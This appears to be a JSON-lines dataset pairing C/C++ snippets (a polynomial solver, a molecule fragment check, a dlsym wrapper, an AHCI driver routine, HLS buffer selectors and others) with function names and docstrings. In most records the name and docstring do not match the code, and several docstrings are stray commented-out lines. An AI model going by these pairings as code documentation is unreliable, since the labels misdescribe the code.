{"content":"{'function_name': 'solve_mcm', 'docstring': '\/\/pz_solver->solvePz(10);', 'code': 'double solve_poly(poly p,double _x0, double rhs,int itn)\\n{\\n    double x0,x,xn,eps;\/\/ \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c\u044b\u0435 \u043f\u0440\u0438\u0431\u043b\u0438\u0436\u0435\u043d\u0438\u044f \u0434\u043b\u044f \u043a\u043e\u0440\u043d\u044f\\n    double a, b,deltax;\/\/ \u0433\u0440\u0430\u043d\u0438\u0446\u044b \u043e\u0442\u0440\u0435\u0437\u043a\u0430 \u0438 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u0430\u044f \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u044c\\n\\n   \/\/ deltax=deltax0;\\n    x=_x0;\\n   \/* a=x0-deltax;\\n    b=x0+deltax;\\n\\n    int nn=0;\\n    double sucs=f(a)*f(b);\\n    while ((sucs>0)&&(nn<10)) \/\/ \u0435\u0441\u043b\u0438 \u0437\u043d\u0430\u043a\u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u043d\u0430 \u043a\u0440\u0430\u044f\u0445 \u043e\u0442\u0440\u0435\u0437\u043a\u0430 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u044b\\n    {\\n        deltax=deltax*2;\\n        a=x0-deltax;\\n        b=x0+deltax;\\n        nn++;\\n        sucs=f(a)*f(b);\\n    }\\n\\n    if (sucs>0)\\n    {\\n        printf(\"DIVERGENCEE in POLY \\\\n\",)\\n        return -1e30\\n    }\\n*\/\\n    for (int i=0; i<itn; ++i)\\n    {\\n      x = x-calc_poly(p,rhs,x)\/calc_d_poly(p,x); \/\/ \u0441\u0447\u0438\u0442\u0430\u0435\u043c \u043f\u0435\u0440\u0432\u043e\u0435 \u043f\u0440\u0438\u0431\u043b\u0438\u0436\u0435\u043d\u0438\u0435\\n    }\\n\\n       \/\/ printf(\"x = %lf f(x)=%e \\\\n\",x*1000.0,calc_poly(p,rhs,x));\\n\\n    return x;\\n\\n}'}","id":2028}
{"content":"{'function_name': 'process_fragments', 'docstring': '\/\/ If we have some fragments to definitely remove, process them', 'code': 'static int\\nlooks_like_mixture_by_atom_count (Molecule & m)\\n{\\n  int nf = m.number_fragments();\\n\\n  int atoms_in_largest_fragment = m.atoms_in_fragment(0);\\n  int atoms_in_second_largest_fragment = m.atoms_in_fragment(1);\\n\\n  if (atoms_in_largest_fragment < atoms_in_second_largest_fragment)\\n    std::swap(atoms_in_largest_fragment, atoms_in_second_largest_fragment);\\n\\n\/\/cerr << \"First two counts \" << atoms_in_largest_fragment << \" and \" << atoms_in_second_largest_fragment << endl;\\n\\n  for (int i = 2; i < nf; i++)\\n  {\\n    int a = m.atoms_in_fragment(i);\\n\\n    if (a > atoms_in_largest_fragment)\\n    {\\n      atoms_in_second_largest_fragment = atoms_in_largest_fragment;\\n      atoms_in_largest_fragment = a;\\n    }\\n    else if (a > atoms_in_second_largest_fragment)\\n      atoms_in_second_largest_fragment = a;\\n  }\\n\\n  if (atoms_in_largest_fragment - atoms_in_second_largest_fragment <= mixture_if_largest_frags_differ_by)\\n    return 1;\\n\\n  return 0;\\n}'}","id":2029}
{"content":"{'function_name': 'DBReportTachmentEvent', 'docstring': '\/\/  event logging level.', 'code': \"CPG CpgDBDatabaseMinMin()\\n{\\n    \/\/  Because there is ~x4.5 KB of ESE catalog data in the base schema (and we don't\\n    \/\/  seem to do a proper append split, or density on catalog is too low! :P), so we\\n    \/\/  need extra pages for the Base ESE schema as you drop in page size to 4KB or less.\\n    const CPG   cpgDatabaseMinMin8K = 30;   \/\/  True min is 29 pages, but wanted to match 32 pages w\/ everything for 4KB and higher.\\n    const CPG   cpgDatabaseMinMin4K = 30;   \/\/  This is one higher than 8KB b\/c we need an extra page for shadow.\\n    const CPG   cpgDatabaseMinMin2K = 31;   \/\/  This is one higher than 4KB b\/c we need an extra extra page for shadow.\\n\\n    CPG cpgRet = cpgDatabaseMinMin2K;\\n    if ( g_cbPage <= 2048 )\\n    {\\n        cpgRet = cpgDatabaseMinMin2K;\\n    }\\n    else if ( g_cbPage <= 4096 )\\n    {\\n        cpgRet = cpgDatabaseMinMin4K;\\n        Assert( cpgRet + cpgDBReserved <= cpgDatabaseApiMinReserved );\\n    }\\n    else\\n    {\\n        Assert( g_cbPage >= 8192 );\\n        cpgRet = cpgDatabaseMinMin8K;\\n        Assert( cpgRet + cpgDBReserved <= cpgDatabaseApiMinReserved );\\n    }\\n\\n    Assert( cpgRet <= cpgDatabaseApiMinReserved );\\n    return cpgRet;\\n}\"}","id":2036}
{"content":"{'function_name': 'do_dlsym', 'docstring': '\/\/ clear any earlier error', 'code': 'CL_DEFUN T_sp core__dlsym(T_sp ohandle, String_sp name) {\\n  void *handle = NULL;\\n  if (ohandle.nilp()) {\\n    SIMPLE_ERROR(BF(\"Invalid ohandle passed -> nil\"));\\n  } else if (Pointer_sp phandle = ohandle.asOrNull<Pointer_O>()) {\\n    handle = phandle->ptr();\\n  } else if (Symbol_sp sym = ohandle.asOrNull<Symbol_O>() ) {\\n\/\/    printf(\"%s:%d handle is symbol: %s\\\\n\", __FILE__, __LINE__, _rep_(sym).c_str());\\n    SYMBOL_EXPORT_SC_(KeywordPkg, rtld_default);\\n    SYMBOL_EXPORT_SC_(KeywordPkg, rtld_next);\\n    SYMBOL_EXPORT_SC_(KeywordPkg, rtld_self);\\n    SYMBOL_EXPORT_SC_(KeywordPkg, rtld_main_only);\\n    if (sym == kw::_sym_rtld_default) {\\n\/\/      printf(\"%s:%d handle is RDLD_DEFAULT\\\\n\", __FILE__, __LINE__ );\\n      handle = RTLD_DEFAULT;\\n\/\/      printf(\"%s:%d RTLD_DEFAULT = %p\\\\n\", __FILE__, __LINE__, RTLD_DEFAULT);\\n\/\/      printf(\"%s:%d handle = %p\\\\n\", __FILE__, __LINE__, handle);\\n    } else if (sym == kw::_sym_rtld_next) {\\n      handle = RTLD_NEXT;\\n#ifdef _TARGET_OS_DARWIN\\n    } else if (sym == kw::_sym_rtld_self) \/\/NOT PORTABLE TO LINUX\\n    {\\n      handle = RTLD_SELF;\\n    } else if (sym == kw::_sym_rtld_main_only) {\\n      handle = RTLD_MAIN_ONLY;\\n#endif\\n    } else {\\n      SIMPLE_ERROR(BF(\"Illegal keyword[%s] for dlsym - only :rtld-next :rtld-self :rtld-default :rtld-main-only are allowed\") % _rep_(sym));\\n    }\\n  } else {\\n    SIMPLE_ERROR(BF(\"Illegal handle argument[%s] for dlsym only a pointer or :rtld-next :rtld-self :rtld-default :rtld-main-only are allowed\") % _rep_(ohandle));\\n  }\\n\/\/  printf(\"%s:%d handle = %p\\\\n\", __FILE__, __LINE__, handle);\\n  string ts = name->get_std_string();\\n  auto result = do_dlsym(handle, ts.c_str());\\n  void * p_sym = std::get<0>( result );\\n  if( p_sym == nullptr ) {\\n    return ( Values(_Nil<T_O>(), SimpleBaseString_O::make( get<1>( result ))) );\\n  }\\n  return ( Values(Pointer_O::create( p_sym ), _Nil<T_O>()) );\\n}'}","id":2047}
{"content":"{'function_name': 'CONTROLLER_API_start', 'docstring': '\/\/ Debug information print function.\\r', 'code': 'void    CONTROLLER_API_stop( void )\\r\\n{\\r\\nint     ID;\\r\\n\\r\\n    if( !CONTROLLER_API_started )      \/\/ API not started in the first place...\\r\\n    {\\r\\n         return;\\r\\n    }\\r\\n\\r\\n    CONTROLLER_API_started = FALSE;    \/\/ Clear started flag.\\r\\n    MODULE_stop();                     \/\/ Register module stop.\\r\\n}'}","id":2048}
{"content":"{'function_name': 'hasValidCorners', 'docstring': '\/\/ first check the black corner', 'code': 'double calculateScore(const cv::Mat& markerImg, int id) {\\n    double totalSum = 0.0;\\n\\n    \/\/ all frame elements\\n    for (const auto& rect : getFrameElements(markerImg.cols)) {\\n        totalSum += cv::sum(markerImg(rect))[0];\\n    }\\n\\n    \/\/ 3 white corners\\n    for (const auto& corner : { UPPER_LEFT, LOWER_LEFT, LOWER_RIGHT }) {\\n        auto square = getSquare(markerImg.cols, corner);\\n        totalSum += cv::sum(markerImg(square))[0];\\n    }\\n\\n    \/\/ 1 black corner\\n    auto square = getSquare(markerImg.cols, UPPER_RIGHT);\\n    totalSum += 255.0 * square.area() - cv::sum(markerImg(square))[0];\\n\\n    \/\/ marker id squares\\n    auto idSqaures = getIdSquares(markerImg.cols);\\n\\n    for (int bitIndex = 0; bitIndex < int(idSqaures.size()); bitIndex++) {\\n\\n        double sum = cv::sum(markerImg(idSqaures[bitIndex]))[0];\\n\\n        \/\/ the square could be white\\n        if (id & (1 << bitIndex)) {\\n            totalSum += sum;\\n        }\\n\\n        \/\/ or black\\n        else {\\n            totalSum += 255.0 * idSqaures[bitIndex].area() - sum;\\n        }\\n    }\\n\\n    return totalSum \/ markerImg.size().area() \/ 255.0;\\n}'}","id":2050}
{"content":"{'function_name': 'processLine', 'docstring': '\/\/filling args[] chopping by space charecter', 'code': 'int readAndProcessLine(char line[],char* args[]){\\n\\n    cout<< \"Zeny@pop>> \";\\n\\n    \/\/reading command from the user\\n    readLine(line);\\n    if(line[0]==\\'\\\\0\\'){\\n        cout<<\"no command\"<<endl;\\n    }\\n\\n    \/\/filling the arguments array\\n    processLine(line,args);\\n\\n    return 1;\\n}'}","id":2060}
{"content":"{'function_name': 'cd_insert', 'docstring': \"\/* we don't free disk's contents *\/\", 'code': 'int main_cd_insert(int argc, char **argv)\\n{\\n    int opt = 0;\\n    const char *p = NULL, *virtdev;\\n    char *file = NULL; \/* modified by cd_insert tokenising it *\/\\n\\n    if ((opt = def_getopt(argc, argv, \"\", \"cd-insert\", 3)) != -1)\\n        return opt;\\n\\n    p = argv[optind];\\n    virtdev = argv[optind + 1];\\n    file = argv[optind + 2];\\n\\n    cd_insert(p, virtdev, file);\\n    return 0;\\n}'}","id":2068}
{"content":"{'function_name': 'search', 'docstring': '\/\/return 0;\\r', 'code': \"std::string calculation(std::string str)\\r\\n{\\r\\n\\tunsigned int i;\\r\\n\\tstd::string substr1;\\r\\n\\tstd::string substr2;\\r\\n\\tint a, b, n = 0,koef=0;\\r\\n\\tbool check = false;\\r\\n\\twhile (!search(str))\\r\\n\\t{\\r\\n\\t\\tif(!n)\\r\\n\\t\\t\\tfor (i = 0; i < str.length(); i++)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tif (str[i] == '*')\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tsubstrings(substr1, substr2, str, a, b, koef, check, i);\\r\\n\\t\\t\\t\\t\\tsubstr1 = std::to_string(neg(substr1) * neg(substr2));\\r\\n\\t\\t\\t\\t\\t\/\/koef--;\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\telse if (str[i] == '\/')\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tsubstrings(substr1, substr2, str, a, b, koef, check, i);\\r\\n\\t\\t\\t\\t\\tsubstr1 = std::to_string(neg(substr1) \/ neg(substr2));\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t}\\r\\n\\t\\tif (i == str.length())\\r\\n\\t\\t\\tn++;\\r\\n\\t\\tif (n)\\r\\n\\t\\t{\\r\\n\\t\\t\\tfor (i = 0; i < str.length(); i++)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tif (str[i] == '+')\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tsubstrings(substr1, substr2, str, a, b, koef, check, i);\\r\\n\\t\\t\\t\\t\\tsubstr1 = std::to_string(neg(substr1) + neg(substr2));\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\telse if (str[i] == '-'&&i!=0)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tsubstrings(substr1, substr2, str, a, b, koef, check, i);\\r\\n\\t\\t\\t\\t\\tsubstr1 = std::to_string(neg(substr1) - neg(substr2));\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t\\t\/\/str = str.erase(a, b - a + 1);\\r\\n\\t\\tif (check)\\r\\n\\t\\t{\\r\\n\\t\\t\\tstr = str.erase(a - 1, b - a + 1 + koef);\\r\\n\\t\\t\\tstr = str.insert(a - 1, substr1);\\r\\n\\t\\t}\\r\\n\\t\\telse\\r\\n\\t\\t{\\r\\n\\t\\t\\tstr = str.erase(a, b - a + 1 + koef);\\r\\n\\t\\t\\tstr = str.insert(a, substr1);\\r\\n\\t\\t}\\r\\n\\t\\tcheck = false;\\r\\n\\t\\tkoef = 0;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/str[str.length()-1] = 'h';\\r\\n\\treturn str;\\r\\n}\"}","id":2078}
{"content":"{'function_name': 'loop', 'docstring': '\/\/ score enable', 'code': \"void sendPDBCommand(byte addr, byte command, byte bankAddr, byte data)\\n{\\n  byte cmdWord[5];\\n  cmdWord[0] = addr;\\n  cmdWord[1] = command;\\n  cmdWord[2] = bankAddr;\\n  cmdWord[3] = (data >> 4) & 0xF;\\n  cmdWord[4] = data & 0xF;\\n\\n  \/\/ Turn off interrupts so the transfer doesn't get interrupted.\\n  noInterrupts();\\n  \/\/ Hardcode transfers to minimize IDLEs between transfers.\\n  \/\/ Using a for-loop adds 5 extra IDLEs between transfers.\\n  SPI.transfer(cmdWord[0]);\\n  SPI.transfer(cmdWord[1]);\\n  SPI.transfer(cmdWord[2]);\\n  SPI.transfer(cmdWord[3]);\\n  SPI.transfer(cmdWord[4]);\\n  \/\/ Re-enable interrupts\\n  interrupts();\\n\\n  return;\\n}\"}","id":2087}
{"content":"{'function_name': 's_exists', 'docstring': '\/* boolean *\/', 'code': 'static double s_cas(void* v) { \/* return 1 if currently accessed section *\/\\n    Section* sec = (Section*) v;\\n    Section* cas = chk_access();\\n    hoc_return_type_code = 2; \/* boolean *\/\\n    if (!sec->prop) {\\n        hoc_execerror(\"Section was deleted\", (char*) 0);\\n    }\\n    if (sec == cas) {\\n        return 1.;\\n    }\\n    return 0.;\\n}'}","id":2095}
{"content":"{'function_name': 'demosaic_by_demosaic_diff_update_0_read_bundle_read', 'docstring': '\/\/ demosaic_diff_rd1', 'code': 'inline hw_uint<16> demosaic_by_rd0_select(demosaic_byb_cache& demosaic_byb, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_by_rd0 read pattern: { demosaic_by_update_0[d0, d1] -> demosaic_byb[2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { demosaic_by_update_0[d0, d1] -> [5 + d1, 3 + d0, 9] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_byb_update_0[d0, d1] -> [5 + d1, 3 + d0, 8] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_byb_demosaic_byb_update_0_write0 = demosaic_byb.demosaic_byb_demosaic_byb_update_0_write0_merged_banks_1.peek(\/* one reader or all rams *\/ 0);\\n  return value_demosaic_byb_demosaic_byb_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":2096}
{"content":"{'function_name': 'ahci_dmasetprd', 'docstring': '\/* Fill S\/G table *\/', 'code': 'static void ahci_execute_transaction(struct ahci_slot *slot) {\\n  struct ahci_channel *ch = slot->ch;\\n  struct ahci_cmd_tab *ctp;\\n  struct ahci_cmd_list *clp;\\n  \/\/ union ccb *ccb = slot->ccb;\\n  PacketAtaio *ataio = slot->ataio;\\n  int port = ataio->target_id & 0x0f;\\n  int fis_size, i, softreset;\\n  uint8_t *fis = ch->dma.rfis + 0x40;\\n  uint8_t val;\\n\\n  \/* Get a piece of the workspace for this request *\/\\n  ctp = (struct ahci_cmd_tab *)(ch->dma.work + AHCI_CT_OFFSET +\\n                                (AHCI_CT_SIZE * slot->slot));\\n  \/* Setup the FIS for this request *\/\\n  if (!(fis_size = ahci_setup_fis(ch, ctp, ataio, slot->slot))) {\\n    device_printf(ch->dev, \"Setting up SATA FIS failed\\\\n\");\\n    ahci_end_transaction(slot, AHCI_ERR_INVALID);\\n    return;\\n  }\\n  \/* Setup the command list entry *\/\\n  clp = (struct ahci_cmd_list *)(ch->dma.work + AHCI_CL_OFFSET +\\n                                 (AHCI_CL_SIZE * slot->slot));\\n  clp->cmd_flags = htole16((ataio->flags & CAM_DIR_OUT ? AHCI_CMD_WRITE : 0) |\\n                           (ataio->func_code == XPT_SCSI_IO\\n                                ? (AHCI_CMD_ATAPI | AHCI_CMD_PREFETCH)\\n                                : 0) |\\n                           (fis_size \/ sizeof(u_int32_t)) | (port << 12));\\n  clp->prd_length = htole16(slot->dma.nsegs);\\n  \/* Special handling for Soft Reset command. *\/\\n  if ((ataio->func_code == XPT_ATA_IO) &&\\n      (ataio->cmd.flags & CAM_ATAIO_CONTROL)) {\\n    if (ataio->cmd.control & ATA_A_RESET) {\\n      softreset = 1;\\n      \/* Kick controller into sane state *\/\\n      ahci_stop(ch);\\n      ahci_clo(ch);\\n      ahci_start(ch, 0);\\n      clp->cmd_flags |= AHCI_CMD_RESET | AHCI_CMD_CLR_BUSY;\\n    } else {\\n      softreset = 2;\\n      \/* Prepare FIS receive area for check. *\/\\n      for (i = 0; i < 20; i++) fis[i] = 0xff;\\n    }\\n  } else\\n    softreset = 0;\\n  clp->bytecount = 0;\\n  clp->cmd_table_phys =\\n      htole64(ch->dma.work_bus + AHCI_CT_OFFSET + (AHCI_CT_SIZE * slot->slot));\\n  bus_dmamap_sync(ch->dma.work_tag, ch->dma.work_map,\\n                  BUS_DMASYNC_PREREAD | BUS_DMASYNC_PREWRITE);\\n  bus_dmamap_sync(ch->dma.rfis_tag, ch->dma.rfis_map, BUS_DMASYNC_PREREAD);\\n  \/* Set ACTIVE bit for NCQ commands. *\/\\n  if ((ataio->func_code == XPT_ATA_IO) &&\\n      (ataio->cmd.flags & CAM_ATAIO_FPDMA)) {\\n    ATA_OUTL(ch->r_mem, AHCI_P_SACT, 1 << slot->slot);\\n  }\\n  \/* If FBS is enabled, set PMP port. *\/\\n  if (ch->fbs_enabled) {\\n    ATA_OUTL(ch->r_mem, AHCI_P_FBS,\\n             AHCI_P_FBS_EN | (port << AHCI_P_FBS_DEV_SHIFT));\\n  }\\n  \/* Issue command to the controller. *\/\\n  slot->state = AHCI_SLOT_RUNNING;\\n  ch->rslots |= (1 << slot->slot);\\n  ATA_OUTL(ch->r_mem, AHCI_P_CI, (1 << slot->slot));\\n  \/* Device reset commands doesn\\'t interrupt. Poll them. *\/\\n  if (ataio->func_code == XPT_ATA_IO &&\\n      (ataio->cmd.command == ATA_DEVICE_RESET || softreset)) {\\n    int count, timeout = ataio->timeout * 100;\\n    enum ahci_err_type et = AHCI_ERR_NONE;\\n\\n    for (count = 0; count < timeout; count++) {\\n      DELAY(10);\\n      if (!(ATA_INL(ch->r_mem, AHCI_P_CI) & (1 << slot->slot))) break;\\n      if ((ATA_INL(ch->r_mem, AHCI_P_TFD) & ATA_S_ERROR) && softreset != 1) {\\n#if 0\\n\\t\\t\\t\\tdevice_printf(ch->dev,\\n\\t\\t\\t\\t    \"Poll error on slot %d, TFD: %04x\\\\n\",\\n\\t\\t\\t\\t    slot->slot, ATA_INL(ch->r_mem, AHCI_P_TFD));\\n#endif\\n        et = AHCI_ERR_TFE;\\n        break;\\n      }\\n      \/* Workaround for ATI SB600\/SB700 chipsets. *\/\\n      if (ataio->target_id == 15 && (ch->quirks & AHCI_Q_ATI_PMP_BUG) &&\\n          (ATA_INL(ch->r_mem, AHCI_P_IS) & AHCI_P_IX_IPM)) {\\n        et = AHCI_ERR_TIMEOUT;\\n        break;\\n      }\\n    }\\n\\n    \/*\\n     * Marvell HBAs with non-RAID firmware do not wait for\\n     * readiness after soft reset, so we have to wait here.\\n     * Marvell RAIDs do not have this problem, but instead\\n     * sometimes forget to update FIS receive area, breaking\\n     * this wait.\\n     *\/\\n    if ((ch->quirks & AHCI_Q_NOBSYRES) == 0 &&\\n        (ch->quirks & AHCI_Q_ATI_PMP_BUG) == 0 && softreset == 2 &&\\n        et == AHCI_ERR_NONE) {\\n      for (; count < timeout; count++) {\\n        bus_dmamap_sync(ch->dma.rfis_tag, ch->dma.rfis_map,\\n                        BUS_DMASYNC_POSTREAD);\\n        val = fis[2];\\n        bus_dmamap_sync(ch->dma.rfis_tag, ch->dma.rfis_map,\\n                        BUS_DMASYNC_PREREAD);\\n        if ((val & ATA_S_BUSY) == 0) break;\\n        DELAY(10);\\n      }\\n    }\\n\\n    if (timeout && (count >= timeout)) {\\n      device_printf(ch->dev, \"Poll timeout on slot %d port %d\\\\n\", slot->slot,\\n                    port);\\n      device_printf(\\n          ch->dev,\\n          \"is %08x cs %08x ss %08x \"\\n          \"rs %08x tfd %02x serr %08x cmd %08x\\\\n\",\\n          ATA_INL(ch->r_mem, AHCI_P_IS), ATA_INL(ch->r_mem, AHCI_P_CI),\\n          ATA_INL(ch->r_mem, AHCI_P_SACT), ch->rslots,\\n          ATA_INL(ch->r_mem, AHCI_P_TFD), ATA_INL(ch->r_mem, AHCI_P_SERR),\\n          ATA_INL(ch->r_mem, AHCI_P_CMD));\\n      et = AHCI_ERR_TIMEOUT;\\n    }\\n\\n    \/* Kick controller into sane state and enable FBS. *\/\\n    if (softreset == 2) ch->eslots |= (1 << slot->slot);\\n    ahci_end_transaction(slot, et);\\n    return;\\n  }\\n  \/* Start command execution timeout *\/\\n  callout_reset_sbt(&slot->timeout, SBT_1MS * ataio->timeout \/ 2, 0,\\n                    (timeout_t *)ahci_timeout, slot, 0);\\n  return;\\n}'}","id":2108}
{"content":"{'function_name': 'Core', 'docstring': '\/\/\u505a\u9009\u62e9\uff1b', 'code': 'vector<vector<int>> permute(vector<int>& nums) {\\n\\n   vector<vector<int>> res; \/\/\u5168\u5c40\u53d8\u91cf\u5b58\u50a8\u7b54\u6848\uff1b\\n\\n   vector<int> track ;\/\/\u5b58\u50a8\u8def\u5f84\uff1b\\n\\n    Core( res, nums, track);\\n\\n    return res;\\n}'}","id":2118}
{"content":"{'function_name': 'buhkomw_r', 'docstring': '\/\/gtk_widget_set_sensitive(GTK_WIDGET(data.knopka),FALSE);\/\/\u041d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u043d\u0430', 'code': 'void  buhkomw_r_v_knopka(GtkWidget *widget,class buhkomw_r_data *data)\\n{\\n\/\/printf(\"buhkomw_r_v_knopka\\\\n\");\\nif(data->kon_ras == 1)\\n return;\\niceb_sizww(data->name_window.ravno(),data->window);\\ngtk_widget_destroy(data->window);\\nreturn;\\n}'}","id":2120}
{"content":"{'function_name': 'make_json2', 'docstring': '\/\/std::string st = info.to_string();', 'code': 'json_type make_json() {\\n    \\n    \\n    \\n        json_type vec1(amo::json_value_array);\\n        vec1.push_back(\"1\");\\n        vec1.push_back(\"2\");\\n        vec1.push_back(\"3\");\\n        \\n        \\n        json_type vec2(amo::json_value_array);\\n        vec2.push_back(4);\\n        vec2.push_back(5);\\n        vec2.push_back(6);\\n        \\n        json_type vec3(amo::json_value_array);\\n        \\n        {\\n            json_type arr3(amo::json_value_array);\\n            arr3.push_back(7);\\n            arr3.push_back(8);\\n            arr3.push_back(9);\\n            \/*arr3.push_back(  u8\"kd wer\\\\\\\\r\\\\\\\\n\u4e2d\u65b9\u5f0f\\\\\\\\u3053\\\\\\\\u3093\\\\\\\\u306b\\\\\\\\u3061\\\\\\\\u306f\\\\\\\\u4e16\\\\\\\\u754c\\\\\\\\uff0112312\u4e2d\u6587\");\\n            arr3.push_back(  \"string txt11111111111111111111111111111111111111111111\");*\/\\n            \\n            vec3.push_back(arr3);\\n            vec3.push_back(arr3);\\n            vec3.push_back(arr3);\\n        }\\n        \\n        \\n        json_type json;\\n        json.put(\"vec1\", vec1);\\n        json.put(\"vec2\", vec2);\\n        json.put(\"vec3\", vec3);\\n        ;\\n        \\n        json_type info;\\n        info.put(\"m_bool\", true);\\n        \/\/info.put(\"m_char\", \\'c\\');\\n        info.put(\"m_int8_t\", 8);\\n        info.put(\"m_int16_t\", 16);\\n        info.put(\"m_int32_t\", 32);\\n        info.put(\"m_int64_t\", 64);\\n        info.put(\"m_uint8_t\", 8u);\\n        info.put(\"m_uint16_t\", 16u);\\n        info.put(\"m_uint32_t\", 32u);\\n        info.put(\"m_uin64_t\", 64u);\\n        info.put(\"m_float\", 1.0);\\n        info.put(\"m_double\", 2.22);\\n        info.put(\"m_string\", \"string txt\");\\n        \/*\\tinfo.put(\"m_strine2\", u8\"kd wer\\\\\\\\r\\\\\\\\n\u4e2d\u65b9\u5f0f\\\\\\\\u3053\\\\\\\\u3093\\\\\\\\u306b\\\\\\\\u3061\\\\\\\\u306f\\\\\\\\u4e16\\\\\\\\u754c\\\\\\\\uff0112312\u4e2d\u6587\");\\n        \\tinfo.put(\"m_string3\", \"string txt11111111111111111111111111111111111111111111\");*\/\\n        \\n        \\n        \/\/ json.put(\"m_jsoninfo2\", info);\\n        \/\/ json.put(\"m_jsoninfo3\", info);\\n        \/\/\\n        \/\/ std::cout << json.to_string() << std::endl;\\n        json_type jsoninfoclass;\\n        jsoninfoclass.put(\"m_jsoninfo1\", info);\\n        jsoninfoclass.put(\"m_jsoninfo2\", info);\\n        \\n        json.put(\"m_jsoninfo2\", jsoninfoclass);\\n        json.put(\"m_jsoninfo3\", jsoninfoclass);\\n        \\n        \/\/ std::cout << json.to_string() << std::endl;\\n        json_type arr(amo::json_value_array);\\n        arr.push_back(jsoninfoclass);\\n        arr.push_back(jsoninfoclass);\\n        arr.push_back(jsoninfoclass);\\n        arr.push_back(jsoninfoclass);\\n        \\n        json.put(\"m_jsoninfo4\", arr);\\n        json.put(\"m_jsoninfo5\", arr);\\n        \\n        json_type arr2(amo::json_value_array);\\n        arr2.push_back(arr);\\n        arr2.push_back(arr);\\n        arr2.push_back(arr);\\n        json.put(\"m_jsoninfo6\", arr2);\\n        \\n        return json;\\n    }'}","id":2121}
{"content":"{'function_name': 'FixedAtan', 'docstring': '\/* else *\/', 'code': 'inline Fixed FixedPow(Fixed a,Fixed b)\\n{\\n\\treturn Float2Fixed (  pow(Fixed2Float(a),Fixed2Float(b) )  );\\n\/\/\\treturn IF(1);\\n}'}","id":2124}
{"content":"{'function_name': 'object_setup', 'docstring': '\/\/objects[4] = triangle1;\\r', 'code': 'int main(int argc, char* argv[])\\r\\n{\\r\\n\\r\\n    \/*\\r\\n    load_image(\"resources\/test.png\", 0);\\r\\n\\r\\n    Camera *camp = world_setup();\\r\\n    tracer(camp);\\r\\n    world_teardown(camp);\\r\\n    cout << endl << \"hits \" << HIT_COUNT << \" total \" << (camp->width * camp->height) << endl;\\r\\n    cout << \"light hits \" << LIGHT_HIT_COUNT << endl;\\r\\n    \/\/cout << \"NUM_RAYS_LIGHT \" << NUM_RAYS_LIGHT << endl;\\r\\n    \/\/cout << \"NUM_RAYS_HIT_LIGHT \" << NUM_RAYS_HIT_LIGHT << endl;\\r\\n    \/\/cout << \"NUM_RAYS_HIT_ELSE \" << NUM_RAYS_HIT_ELSE << endl;\\r\\n    cout << \"NUM_HIT_SPHERE \" << NUM_HIT_SPHERE << endl;\\r\\n    cout << \"NUM_CREATED \" << NUM_CREATED << endl;\\r\\n    cout << (ObjType::plane == ObjType::light) << endl;\\r\\n    printf(\"Hit any key to continue> \");\\r\\n    getchar();\\r\\n    *\/\\r\\n\\r\\n    if (RUN_TEST) {\\r\\n        ::testing::InitGoogleTest(&argc, argv);\\r\\n        return RUN_ALL_TESTS();\\r\\n    } else {\\r\\n        return 0;\\r\\n    }\\r\\n}'}","id":2129}
{"content":"{'function_name': 'denoiseb_rd27_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd28_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd28 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 967 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_967();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":2135}
